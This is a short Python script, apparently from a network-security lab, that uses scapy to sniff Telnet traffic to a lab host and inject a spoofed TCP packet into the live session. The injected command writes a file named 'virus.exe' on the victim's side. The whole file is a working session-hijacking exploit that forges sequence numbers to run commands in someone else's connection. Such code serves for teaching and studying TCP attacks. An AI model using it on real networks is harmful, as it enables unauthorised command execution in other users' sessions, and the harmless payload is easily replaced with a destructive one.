from scapy.all import *

def hijack_session(pkt):
  #pkt.show()
  try:
    if (pkt[Raw].load == b'\x7f'):
      ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
      tcp = TCP(sport=pkt[TCP].sport,
                dport=pkt[TCP].dport,
                flags="PA",
                seq=pkt[TCP].seq+1,
                ack=pkt[TCP].ack)

      data = "echo 'You were session hijacked' > virus.exe\n"
      spoofed_pkt = ip/tcp/data
      #spoofed_pkt.show()
      send(spoofed_pkt)

      print("virus.exe is added")
  except Exception as e:
    #print("error: ",e)
    pass

print("sniffing.....")
iface = input("interace id: ")
pkt = sniff(iface=iface,
            filter='tcp and port 23 and dst host 10.9.0.5',
            prn=hijack_session)
